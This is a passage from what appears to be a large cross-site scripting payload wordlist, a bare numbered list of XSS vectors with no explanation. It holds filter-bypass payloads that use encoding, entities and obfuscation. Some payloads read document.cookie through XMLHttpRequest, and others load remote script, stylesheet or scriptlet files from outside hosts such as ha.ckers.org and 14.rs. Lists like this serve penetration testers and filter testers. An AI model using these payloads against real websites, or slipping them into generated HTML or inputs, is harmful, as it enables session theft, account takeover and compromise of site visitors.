6226 | <script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#
6227 | <video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
6228 | <script for=document event=onreadystatechange>getElementById('safe123').click()</script>
6229 | <script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>
6230 | <script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>
6231 | <iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
6232 | <iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
6233 | <iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
6234 | <iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
6235 | <script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#
6236 | <iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
6237 | <textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
6238 | <textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
6239 | <iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
6240 | <textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
6241 | <script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
6242 | <textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
6243 | <object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
6244 | <script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
6245 | %3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E
6246 | <iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
6247 | <a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
6248 | <a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
6249 | <a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
6250 | <a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
6251 | Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
6252 | <a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
6253 | <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
6254 | <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
6255 | <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
6256 | <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
6257 | <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
6258 | <var onmouseover="prompt(1)">On Mouse Over</var>?
6259 | <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
6260 | <img src="/" =_=" title="onerror='prompt(1)'">
6261 | <%<!--'%><script>alert(1);</script -->
6262 | <script src="data:text/javascript,alert(1)"></script>
6263 | <iframe/src \/\/onload = prompt(1)
6264 | <iframe/onreadystatechange=alert(1)
6265 | <svg/onload=alert(1)
6266 | <input value=<><iframe/src=javascript:confirm(1)
6267 | <input type="text" value=``<div/onmouseover='alert(1)'>X</div>
6268 | http://www.<script>alert(1)</script .com
6269 | <iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
6270 | <svg><script ?>alert(1)
6271 | <iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
6272 | <img src=`xx:xx`onerror=alert(1)>
6273 | <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
6274 | <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?
6275 | <math><a xlink:href="//jsfiddle.net/t846h/">click
6276 | <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
6277 | <svg contentScriptType=text/vbs><script>MsgBox+1
6278 | <a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
6279 | <iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
6280 | <script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
6281 | <script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
6282 | <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????
6283 | <object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
6284 | <script>+-+-1-+-+alert(1)</script>
6285 | <body/onload=&lt;!--&gt;&#10alert(1)>
6286 | <script itworksinallbrowsers>/*<script* */alert(1)</script ?
6287 | <img src ?itworksonchrome?\/onerror = alert(1)???
6288 | <svg><script>//&NewLine;confirm(1);</script </svg>
6289 | <svg><script onlypossibleinopera:-)> alert(1)
6290 | <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
6291 | <script x> alert(1) </script 1=2
6292 | <div/onmouseover='alert(1)'> style="x:">
6293 | <--`<img/src=` onerror=alert(1)> --!>
6294 | <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?
6295 | <div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?
6296 | "><img src=x onerror=window.open('https://www.google.com/');>
6297 | <form><button formaction=javascript&colon;alert(1)>CLICKME
6298 | <math><a xlink:href="//jsfiddle.net/t846h/">click
6299 | <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
6300 | <iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
6301 | <a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
6302 | "><img src=x onerror=prompt(1);>
6303 | <SCRIPT>alert('XSS');</SCRIPT>
6304 | '';!--"<XSS>=&{()}
6305 | <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
6306 | <IMG SRC="javascript:alert('XSS');">
6307 | <IMG SRC=javascript:alert('XSS')>
6308 | <IMG SRC=JaVaScRiPt:alert('XSS')>
6309 | <IMG SRC=javascript:alert(&quot;XSS&quot;)>
6310 | <IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
6311 | <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
6312 | SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
6313 | <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
6314 | <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
6315 | <IMG SRC="jav	ascript:alert('XSS');">
6316 | <IMG SRC="jav&#x09;ascript:alert('XSS');">
6317 | <IMG SRC="jav&#x0A;ascript:alert('XSS');">
6318 | <IMG SRC="jav&#x0D;ascript:alert('XSS');">
6319 | <IMG SRC=" &#14;  javascript:alert('XSS');">
6320 | <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
6321 | <SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
6322 | <IMG SRC="javascript:alert('XSS')"
6323 | <SCRIPT>a=/XSS/
6324 | \";alert('XSS');//
6325 | <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
6326 | <BODY BACKGROUND="javascript:alert('XSS')">
6327 | <BODY ONLOAD=alert('XSS')>
6328 | <IMG DYNSRC="javascript:alert('XSS')">
6329 | <IMG LOWSRC="javascript:alert('XSS')">
6330 | <BGSOUND SRC="javascript:alert('XSS');">
6331 | <BR SIZE="&{alert('XSS')}">
6332 | <LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
6333 | <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
6334 | <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
6335 | <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
6336 | <META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
6337 | <STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
6338 | <IMG SRC='vbscript:msgbox("XSS")'>
6339 | <IMG SRC="mocha:[code]">
6340 | <IMG SRC="livescript:[code]">
6341 | <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
6342 | <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
6343 | <META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
6344 | <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
6345 | <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
6346 | <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
6347 | <TABLE BACKGROUND="javascript:alert('XSS')">
6348 | <DIV STYLE="background-image: url(javascript:alert('XSS'))">
6349 | <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
6350 | <DIV STYLE="width: expression(alert('XSS'));">
6351 | <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
6352 | <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
6353 | <XSS STYLE="xss:expression(alert('XSS'))">
6354 | exp/*<XSS STYLE='no\xss:noxss("*//*");
6355 | <STYLE TYPE="text/javascript">alert('XSS');</STYLE>
6356 | <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
6357 | <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
6358 | <BASE HREF="javascript:alert('XSS');//">
6359 | <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
6360 | <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
6361 | getURL("javascript:alert('XSS')")
6362 | a="get";
6363 | <!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
6364 | <XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
6365 | <HTML><BODY>
6366 | <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
6367 | <!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
6368 | <? echo('<SCR)';
6369 | <META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
6370 | <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
6371 | <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
6372 | <SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
6373 | <SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
6374 | <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
6375 | <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
6376 | <svg%0Aonload=%09((pro\u006dpt))()//
6377 | <sCriPt x>(((confirm)))``</scRipt x>
6378 | <w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
6379 | <deTAiLs/open/oNtoGGle=confirm()>
6380 | <scRiPt y="><">/*<sCRipt* */prompt()</script
6381 | <A href="javascript%26colon;confirm()">click
6382 | <sVg oNloaD=write()>
6383 | <A href=javas%26#99;ript:alert(1)>click
6384 | <sCrIpt/"<a"/srC=data:=".<a,[8].some(confirm)>
6385 | <svG/x=">"/oNloaD=confirm()//
6386 | <--`<iMG/srC=` onerror=confirm``> --!>
6387 | <SVg </onlOad ="1> (_=prompt,_(1)) "">
6388 | <!--><scRipT src=//14.rs>
6389 | <sCriPt/src=//14.rs?
6390 | <sCRIpt x=">" src=//15.rs></script>
6391 | <D3/OnMouSEenTer=[2].find(confirm)>z
6392 | <D3"<"/OncLick="1>[confirm``]"<">z
6393 | <D3/OnpOinTeReENter=confirm``>click here
6394 | <!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
6395 | <Z oncut=alert()>x
6396 | <iFrAMe/src \/\/onload = prompt(1)
6397 | <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
6398 | >>> vectors()
6399 | <div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'`-->]]>]</div><div id="5"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div><div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div><div id="7"><input onfocus=alert(7) autofocus>//["'`-->]]>]</div><div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div><div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">X</a>//["'`-->]]>]</div><div id="10"><video poster=javascript:alert(10)//></video>//["'`-->]]>]</div><div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'`-->]]>]</div><div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div><div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div><div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div><div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div><div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["'`-->]]>]</div><div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["'`-->]]>]</div><div id="18"><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>//["'`-->]]>]</div><div id="19"><meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾//["'`-->]]>]</div><div id="20"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//["'`-->]]>]</div><div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//["'`-->]]>]</div><div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div><div id="23"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//["'`-->]]>]</div><div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//["'`-->]]>]</div><div id="25"><script src="#">{alert(25)}</script>;1//["'`-->]]>]</div><div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["'`-->]]>]</div><div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div>
6400 | <div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//["'`-->]]>]</div>
6401 | <div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["'`-->]]>]</div><div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["'`-->]]>]</div><div id="31"><frameset onload=alert(31)>//["'`-->]]>]</div><div id="32"><table background="javascript:alert(32)"></table>//["'`-->]]>]</div><div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(2)">XXX</a>//["'`-->]]>]</div><div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["'`-->]]>]</div><div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["'`-->]]>]</div><div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)">XXX</a>//["'`-->]]>]</div><div id="37"><!--<img src="--><img src=x onerror=alert(37)//">//["'`-->]]>]</div><div id="38"><comment><img src="</comment><img src=x onerror=alert(38)//">//["'`-->]]>]</div>
6402 | <div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->
6403 | <![><img src="]><img src=x onerror=alert(39)//">
6404 | <!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
6405 | <svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>//["'`-->]]>]</div>
6406 | <div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>
6407 | <div id="41"><li style=list-style:url() onerror=alert(41)></li>
6408 | <div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//["'`-->]]>]</div>
6409 | <div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">XXX</a></body>//["'`-->]]>]</div>
6410 | <div id="43"><?xml version="1.0" standalone="no"?>
6411 | <html xmlns="http://www.w3.org/1999/xhtml">
6412 | <head><style type="text/css">@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}</style></head>
6413 | <body>Hello</body>
6414 | </html>//["'`-->]]>]</div>
6415 | <div id="44"><style>*[{}@import'test.css?]{color: green;}</style>X//["'`-->]]>]</div><div id="45"><div style="font-family:'foo[a];color:red;';">XXX</div>//["'`-->]]>]</div><div id="46"><div style="font-family:foo}color=red;">XXX</div>//["'`-->]]>]</div><div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["'`-->]]>]</div><div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["'`-->]]>]</div><div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["'`-->]]>]</div><div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["'`-->]]>]</div><div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["'`-->]]>]</div><div id="52"><x style="behavior:url(test.sct)">//["'`-->]]>]</div>
6416 | <div id="53"><xml id="xss" src="test.htc"></xml>
6417 | <label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>
